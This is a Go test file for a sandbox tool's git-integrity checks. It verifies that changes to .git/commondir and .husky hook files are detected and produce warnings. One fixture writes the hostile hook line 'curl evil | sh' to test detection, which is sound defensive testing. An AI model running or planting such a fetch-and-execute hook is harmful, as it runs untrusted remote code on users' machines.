package sandbox

import (
	"path/filepath"
	"strings"
	"testing"
)

func TestCheckGitAgainstRecord(t *testing.T) {
	ws := t.TempDir()
	write(t, filepath.Join(ws, ".git", "config"), "[core]\n")
	write(t, filepath.Join(ws, ".git", "HEAD"), "ref: refs/heads/main\n")
	st := Store{Root: t.TempDir()}
	m := Meta{Name: "s", Workspace: ws}
	if g, err := st.CheckGit(m); err != nil || g != nil {
		t.Fatalf("no record: want nil, got %+v %v", g, err)
	}
	if err := st.RecordGit(m); err != nil {
		t.Fatal(err)
	}
	write(t, filepath.Join(ws, ".git", "HEAD"), "ref: refs/heads/other\n")
	if g, err := st.CheckGit(m); err != nil || !g.OK {
		t.Fatalf("HEAD change: want ok, got %+v %v", g, err)
	}
	write(t, filepath.Join(ws, ".git", "commondir"), "/tmp/evil\n")
	g, err := st.CheckGit(m)
	if err != nil || g.OK || len(g.Findings) != 1 {
		t.Fatalf("commondir: want one finding, got %+v %v", g, err)
	}
	if w := GitWarning(m, *g); !strings.Contains(w, ".git/commondir") || !strings.Contains(w, "podbox git-check s --accept") {
		t.Fatalf("warning lacks path or fix: %s", w)
	}
	if err := st.RecordGit(m); err != nil {
		t.Fatal(err)
	}
	if g, _ := st.CheckGit(m); !g.OK {
		t.Fatalf("after accept: %+v", g)
	}
}

func TestHookFilesInIntegrity(t *testing.T) {
	ws := t.TempDir()
	m := Meta{Name: "s", Workspace: ws}
	if n := HookNotice(m); n != "" {
		t.Fatalf("notice without hooks: %s", n)
	}
	write(t, filepath.Join(ws, ".husky", "pre-commit"), "npm test\n")
	if n := HookNotice(m); !strings.Contains(n, "runs code from .husky/ on your commits") || !strings.Contains(n, "--clone") {
		t.Fatalf("notice: %s", n)
	}
	st := Store{Root: t.TempDir()}
	if err := st.RecordGit(m); err != nil {
		t.Fatal(err)
	}
	write(t, filepath.Join(ws, ".husky", "pre-commit"), "curl evil | sh\n")
	g, err := st.CheckGit(m)
	if err != nil || g.OK || len(g.Findings) != 1 || g.Findings[0].Path != ".husky/pre-commit" {
		t.Fatalf("want a finding on .husky/pre-commit, got %+v %v", g, err)
	}
	w := GitWarning(m, *g)
	if !strings.Contains(w, "GIT HOOK FILES CHANGED") || strings.Contains(w, "TAMPERING") || !strings.Contains(w, "podbox git-check s --accept") {
		t.Fatalf("warning: %s", w)
	}
}
